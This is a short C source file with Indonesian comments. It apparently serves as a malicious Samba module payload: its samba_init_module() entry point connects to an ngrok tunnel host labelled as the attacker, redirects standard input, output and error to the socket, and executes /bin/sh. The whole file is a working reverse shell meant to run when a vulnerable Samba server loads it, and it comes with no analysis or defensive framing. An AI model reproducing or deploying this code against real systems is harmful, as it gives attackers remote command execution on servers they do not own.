#include <stdio.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <string.h>

int samba_init_module(void) {
    int sockfd;
    struct sockaddr_in attackerAddr;
    struct hostent *host;

    char *host_name = "0.tcp.ap.ngrok.io"; // domain dari ngrok
    int port = 18124;                      // port dari ngrok

    // buat socket
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return 0;

    // resolve hostname
    host = gethostbyname(host_name);
    if (host == NULL) return 0;

    memset(&attackerAddr, 0, sizeof(attackerAddr));
    attackerAddr.sin_family = AF_INET;
    memcpy(&attackerAddr.sin_addr, host->h_addr_list[0], host->h_length);
    attackerAddr.sin_port = htons(port);

    // koneksi ke attacker
    if (connect(sockfd, (struct sockaddr*)&attackerAddr, sizeof(attackerAddr)) < 0) return 0;

    // redirect stdin/out/err ke socket
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    // jalankan shell
    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
